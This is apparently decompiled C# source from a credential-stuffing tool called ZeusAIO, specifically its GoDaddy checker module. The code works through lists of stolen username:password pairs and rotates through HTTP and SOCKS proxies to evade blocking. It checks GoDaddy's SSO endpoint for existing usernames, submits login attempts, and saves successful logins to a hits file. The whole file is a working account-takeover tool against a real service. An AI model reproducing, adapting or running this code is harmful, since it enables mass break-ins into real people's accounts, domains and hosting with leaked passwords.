// Decompiled with JetBrains decompiler
// Type: Godaddy.Check
// Assembly: ZeusAIO, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 70786947-2129-410F-AE9A-C082629DAC36
// Assembly location: C:\Users\ofekt\Desktop\סורס\ZeusAIO.exe

using Leaf.xNet;
using System;
using System.Collections.Generic;
using System.Drawing;
using System.Linq;
using System.Net.Security;
using System.Security.Cryptography.X509Certificates;
using System.Text;
using ZeusAIO;

namespace Godaddy
{
  internal class Check
  {
    public static int threads = 0;
    public static string proxyprotocol = "";
    public static List<string> combos;
    public static List<string> proxies1;
    public static int proxytotal = 0;
    public static int combototal = 0;
    public static int free = 0;
    public static int comboindex = 0;
    public static int cpm = 0;
    public static int cpm_aux = 0;
    public static int check = 0;
    public static int error = 0;
    public static int hit = 0;
    public static int bad = 0;
    public static int h;
    public static int m;
    public static int s;

    public static bool CheckAccount(string[] s, string proxy)
    {
      for (int index = 0; index < Config.config.Retries + 1; ++index)
      {
        while (true)
        {
          try
          {
            using (HttpRequest httpRequest = new HttpRequest())
            {
              proxy = mainmenu.proxies.ElementAt<string>(new Random().Next(mainmenu.proxiesCount));
              if (mainmenu.proxyProtocol == "HTTP")
                httpRequest.Proxy = (ProxyClient) HttpProxyClient.Parse(proxy);
              if (mainmenu.proxyProtocol == "SOCKS4")
                httpRequest.Proxy = (ProxyClient) Socks4ProxyClient.Parse(proxy);
              if (mainmenu.proxyProtocol == "SOCKS5")
                httpRequest.Proxy = (ProxyClient) Socks5ProxyClient.Parse(proxy);
              httpRequest.UserAgent = "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko";
              httpRequest.IgnoreProtocolErrors = true;
              httpRequest.AllowAutoRedirect = false;
              httpRequest.AddHeader("Cookie", "visitor=vid=b35ec6bc-83fe-429e-9166-e335881f061a;");
              httpRequest.AddHeader("Host", "sso.godaddy.com");
              httpRequest.AddHeader("Origin", "https://sso.godaddy.com");
              httpRequest.AddHeader("Referer", "https://sso.godaddy.com/?realm=idp&path=%2Fproducts&app=account");
              httpRequest.AddHeader("Sec-Fetch-Dest", "empty");
              httpRequest.AddHeader("Sec-Fetch-Mode", "cors");
              httpRequest.AddHeader("Sec-Fetch-Site", "same-origin");
              string str1 = "{\"checkusername\":\"" + s[0] + "\"}";
              httpRequest.SslCertificateValidatorCallback += (RemoteCertificateValidationCallback) ((obj, cert, ssl, error) => (cert as X509Certificate2).Verify());
              string str2 = httpRequest.Post("https://sso.godaddy.com/v1/api/idp/user/checkusername", str1, "application/json").ToString();
              if (!str2.Contains("username is invalid") && !str2.Contains("username is available"))
              {
                if (str2.Contains("username is unavailable") || str2.Contains("message\": \"Ok"))
                {
                  httpRequest.AddHeader("Cookie", "visitor=vid=b35ec6bc-83fe-429e-9166-e335881f061a;");
                  httpRequest.AddHeader("Host", "sso.godaddy.com");
                  httpRequest.AddHeader("DNT", "1");
                  httpRequest.AddHeader("Origin", "https://sso.godaddy.com");
                  httpRequest.AddHeader("Referer", "https://sso.godaddy.com/?realm=idp&path=%2Fproducts&app=account");
                  httpRequest.AddHeader("Sec-Fetch-Dest", "empty");
                  httpRequest.AddHeader("Sec-Fetch-Mode", "cors");
                  httpRequest.AddHeader("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Safari/537.36");
                  string str3 = "{\"username\":\"" + s[0] + "\",\"password\":\"" + s[1] + "\",\"remember_me\":false,\"plid\":1,\"API_HOST\":\"godaddy.com\",\"captcha_code\":\"\",\"captcha_type\":\"recaptcha_v2_invisible\"}";
                  string str4 = httpRequest.Post("https://sso.godaddy.com/v1/api/idp/login?realm=idp&path=%2Fproducts&app=account", str3, "application/json").ToString();
                  if (!str4.Contains("Username and password did not match"))
                  {
                    if (str4.Contains("message\": \"Ok\""))
                    {
                      ++mainmenu.hits;
                      if (mainmenu.p1 == "2")
                        Colorful.Console.WriteLine("[HIT - GODADDY] " + s[0] + ":" + s[1], Color.Green);
                      Export.AsResult("/Godaddy_hits", s[0] + ":" + s[1]);
                      return false;
                    }
                    break;
                  }
                  break;
                }
                break;
              }
              break;
            }
          }
          catch (Exception ex)
          {
            ++mainmenu.errors;
          }
        }
      }
      return false;
    }

    public static string Base64Encode(string plainText) => Convert.ToBase64String(Encoding.UTF8.GetBytes(plainText));
  }
}
